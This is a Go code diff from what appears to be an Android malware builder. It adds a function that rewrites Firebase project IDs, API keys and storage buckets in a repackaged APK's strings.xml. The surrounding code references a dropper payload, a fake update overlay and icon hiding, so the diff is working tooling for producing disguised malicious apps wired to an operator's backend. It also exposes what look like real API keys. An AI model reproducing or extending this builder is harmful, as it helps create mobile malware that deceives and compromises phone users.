@@ -1838,6 +1838,9 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	syncSmali := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "services", "SyncQYAdapter.smali")
 	patchFakeUpdateOverlay(syncSmali)
 
+	stringsXml := filepath.Join(workDir, "res", "values", "strings.xml")
+	patchFirebaseResources(stringsXml)
+
 	hideIcon := sess.HideIcon
 	if isInnerPayload {
 		hideIcon = true
@@ -2328,6 +2331,37 @@ func patchFakeUpdateOverlay(smaliPath string) {
 
 	if err := os.WriteFile(smaliPath, []byte(patched), 0644); err != nil {
 		log.Printf("[BUILDER] WARNING: patchFakeUpdateOverlay write: %v", err)
+	}
+}
+
+func patchFirebaseResources(xmlPath string) {
+	data, err := os.ReadFile(xmlPath)
+	if err != nil {
+		log.Printf("[BUILDER] WARNING: patchFirebaseResources read: %v", err)
+		return
+	}
+	s := string(data)
+
+	replacements := [][2]string{
+		{`<string name="gcm_defaultSenderId">558390505418</string>`, `<string name="gcm_defaultSenderId">615446537426</string>`},
+		{`<string name="google_api_key">AIzaSyBEN56RjB8pakZs51YqnvOm0QQ95s6ER70</string>`, `<string name="google_api_key">AIzaSyBz-d8u7azuqnJOzBkABDiu1QipmHCCZXg</string>`},
+		{`<string name="google_app_id">1:558390505418:android:e1d5f073e10278fe2f6933</string>`, `<string name="google_app_id">1:615446537426:android:66e27d8096de43ba20790b</string>`},
+		{`<string name="google_storage_bucket">gun-donch1k.firebasestorage.app</string>`, `<string name="google_storage_bucket">ochko228-b4ff1.firebasestorage.app</string>`},
+		{`<string name="project_id">gun-donch1k</string>`, `<string name="project_id">ochko228-b4ff1</string>`},
+	}
+
+	patched := s
+	for _, r := range replacements {
+		patched = strings.ReplaceAll(patched, r[0], r[1])
+	}
+
+	if patched == s {
+		log.Printf("[BUILDER] WARNING: patchFirebaseResources: no replacements made in %s", xmlPath)
+		return
+	}
+
+	if err := os.WriteFile(xmlPath, []byte(patched), 0644); err != nil {
+		log.Printf("[BUILDER] WARNING: patchFirebaseResources write: %v", err)
 	}
 }
 
